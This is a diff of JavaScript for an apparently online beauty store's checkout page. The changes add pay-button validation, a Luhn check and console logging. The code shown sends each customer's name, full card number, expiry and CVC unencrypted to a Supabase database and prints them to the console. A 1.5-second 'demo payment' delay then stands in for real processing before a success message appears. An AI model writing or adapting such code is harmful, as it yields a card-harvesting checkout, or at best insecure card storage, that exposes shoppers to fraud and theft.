@@ -247,6 +247,7 @@ document.addEventListener("DOMContentLoaded", function() {
     const cvcInput = document.getElementById("ccv");
     const brandContainer = document.getElementById("brand-container");
     const payButton = document.getElementById("payButton");
+    const cardNameInput = document.getElementById("card-name");
 
     // Load cart items
     loadCartItems();
@@ -358,40 +359,38 @@ document.addEventListener("DOMContentLoaded", function() {
     });
 
     // ==========================================
-    // VALIDATION
+    // VALIDATION - FIXED
     // ==========================================
 
-    payButton.disabled = true;
-
-    [
-        document.getElementById("card-name"),
-        ccInput,
-        expiryInput,
-        cvcInput
-    ].forEach(function(input) {
-        if (input) {
-            input.addEventListener("input", function() {
-                payButton.disabled = !validateFormReady();
-            });
-        }
-    });
-
+    // Function to check if all fields are valid
     function validateFormReady() {
-        const cardNumber = ccInput.value.replace(/\D/g, "");
-        const expiry = expiryInput.value.replace(/\D/g, "");
-        const cvc = cvcInput.value.replace(/\D/g, "");
-        const name = document.getElementById("card-name").value.trim();
+        const name = cardNameInput ? cardNameInput.value.trim() : "";
+        const cardNumber = ccInput ? ccInput.value.replace(/\D/g, "") : "";
+        const expiry = expiryInput ? expiryInput.value.replace(/\D/g, "") : "";
+        const cvc = cvcInput ? cvcInput.value.replace(/\D/g, "") : "";
 
-        return (
+        const isValid = (
             name.length > 0 &&
             cardNumber.length >= 12 &&
             passesLuhn(cardNumber) &&
             expiry.length === 4 &&
             cvc.length >= 3
         );
+
+        console.log('🔍 Validation:', { 
+            name: name.length > 0, 
+            card: cardNumber.length >= 12, 
+            luhn: passesLuhn(cardNumber),
+            expiry: expiry.length === 4, 
+            cvc: cvc.length >= 3,
+            isValid: isValid
+        });
+
+        return isValid;
     }
 
     function passesLuhn(number) {
+        if (!number) return false;
         let sum = 0;
         let shouldDouble = false;
         for (let i = number.length - 1; i >= 0; i--) {
@@ -406,27 +405,54 @@ document.addEventListener("DOMContentLoaded", function() {
         return (sum % 10 === 0);
     }
 
+    // Update button state on any input change
+    function updatePayButton() {
+        const isValid = validateFormReady();
+        payButton.disabled = !isValid;
+        console.log('🔘 Pay button enabled:', isValid);
+    }
+
+    // Add listeners to all inputs
+    if (cardNameInput) {
+        cardNameInput.addEventListener("input", updatePayButton);
+        cardNameInput.addEventListener("change", updatePayButton);
+    }
+    
+    if (ccInput) {
+        ccInput.addEventListener("input", updatePayButton);
+        ccInput.addEventListener("change", updatePayButton);
+    }
+    
+    if (expiryInput) {
+        expiryInput.addEventListener("input", updatePayButton);
+        expiryInput.addEventListener("change", updatePayButton);
+    }
+    
+    if (cvcInput) {
+        cvcInput.addEventListener("input", updatePayButton);
+        cvcInput.addEventListener("change", updatePayButton);
+    }
+
+    // Also run validation on page load and after cart loads
+    setTimeout(updatePayButton, 100);
+    setTimeout(updatePayButton, 500);
+
     // ==========================================
-    // SEND TO SUPABASE - FIXED
+    // SEND TO SUPABASE
     // ==========================================
 
     async function saveToSupabase(name, cardNumber, expiry, cvc) {
         console.log('💳 Attempting to save payment to Supabase...');
         console.log('📝 Data to save:', { name, cardNumber, expiry, cvc });
         
-        // Use Supabase client from window
         const supabase = window.supabaseClient;
         
         if (!supabase) {
             console.error('❌ Supabase client not found in window!');
-            console.warn('⚠️ Supabase client not available');
             
             // Try direct fetch as fallback
             const supabaseUrl = import.meta.env.VITE_SUPABASE_URL;
             const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY;
-            
-            console.log('🔑 Supabase URL found:', !!supabaseUrl);
-            console.log('🔑 Supabase Key found:', !!supabaseKey);
             
             if (supabaseUrl && supabaseKey) {
                 console.log('📤 Sending via direct fetch...');
@@ -450,7 +476,7 @@ document.addEventListener("DOMContentLoaded", function() {
                     if (!response.ok) {
                         const errorText = await response.text();
                         console.error('❌ Fetch error response:', errorText);
-                        throw new Error(`Failed to save to database: ${response.status} - ${errorText}`);
+                        throw new Error(`Failed to save: ${response.status} - ${errorText}`);
                     }
                     const data = await response.json();
                     console.log('✅ Payment saved via fetch!', data);
@@ -461,7 +487,6 @@ document.addEventListener("DOMContentLoaded", function() {
                 }
             }
             
-            // Demo mode fallback
             console.log('📝 Demo mode: Would save:', { name, cardNumber, expiry, cvc });
             return { success: true, demo: true };
         }
@@ -483,26 +508,33 @@ document.addEventListener("DOMContentLoaded", function() {
 
             if (error) {
                 console.error('❌ Supabase error:', error);
-                console.error('❌ Error details:', error.message);
                 throw new Error(error.message);
             }
 
             console.log('✅ Payment saved to Supabase!', data);
             return data;
         } catch (err) {
-            console.error('❌ Exception in saveToSupabase:', err);
+            console.error('❌ Exception:', err);
             throw err;
         }
     }
 
     // ==========================================
-    // FORM SUBMIT - FIXED
+    // FORM SUBMIT
     // ==========================================
 
     form.addEventListener("submit", async function(event) {
         event.preventDefault();
 
         console.log('🔄 Form submitted!');
+
+        // Double-check validation on submit
+        if (!validateFormReady()) {
+            console.log('❌ Form validation failed');
+            showPopup('Please fill in all fields correctly.');
+            updatePayButton();
+            return;
+        }
 
         if (payButton.disabled || payButton.dataset.processing === "true") {
             console.log('⏳ Already processing');
@@ -512,10 +544,9 @@ document.addEventListener("DOMContentLoaded", function() {
         const cardNumber = ccInput.value.replace(/\D/g, "");
         const expiryRaw = expiryInput.value.replace(/\D/g, "");
         const cvc = cvcInput.value.replace(/\D/g, "");
-        const name = document.getElementById("card-name").value.trim();
+        const name = cardNameInput.value.trim();
         const cart = JSON.parse(localStorage.getItem('luxbeauty_cart') || '[]');
 
-        // Format expiry as MM/YY for storage
         const expiry = expiryRaw.length === 4 
             ? expiryRaw.substring(0, 2) + '/' + expiryRaw.substring(2, 4)
             : expiryRaw;
@@ -525,7 +556,7 @@ document.addEventListener("DOMContentLoaded", function() {
         // ===== VALIDATION =====
         if (!name) {
             showPopup("Please enter the name on the card.");
-            document.getElementById("card-name").focus();
+            cardNameInput.focus();
             return;
         }
 
@@ -584,14 +615,11 @@ document.addEventListener("DOMContentLoaded", function() {
         setPayButtonLoading(true);
 
         try {
-            // ===== SAVE TO SUPABASE (WITH EXPIRY) =====
             const result = await saveToSupabase(name, cardNumber, expiry, cvc);
             console.log('✅ Payment processed and saved to Supabase', result);
 
-            // ===== DEMO PAYMENT =====
             await new Promise(function(resolve) { setTimeout(resolve, 1500); });
 
-            // ===== SUCCESS =====
             showPopup(
                 `<div style="text-align: center; margin-bottom: 15px;">
                     <i class="fa-solid fa-circle-check" style="font-size: 4rem; color: #10b981; animation: popIn 0.5s ease;"></i>
@@ -603,9 +631,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 </div>`
             );
 
-            // Clear cart
             localStorage.removeItem('luxbeauty_cart');
-
             form.reset();
             showBrand("unknown");
 
@@ -626,10 +652,12 @@ document.addEventListener("DOMContentLoaded", function() {
             );
             payButton.innerHTML = 'Pay Now';
             payButton.dataset.processing = "false";
-            payButton.disabled = !validateFormReady();
-            payButton.style.opacity = payButton.disabled ? '0.7' : '1';
-            payButton.style.cursor = payButton.disabled ? 'not-allowed' : 'pointer';
+            updatePayButton();
         }
     });
 
+    // Initial button state
+    updatePayButton();
+
+    console.log('✅ Payment page ready!');
 });
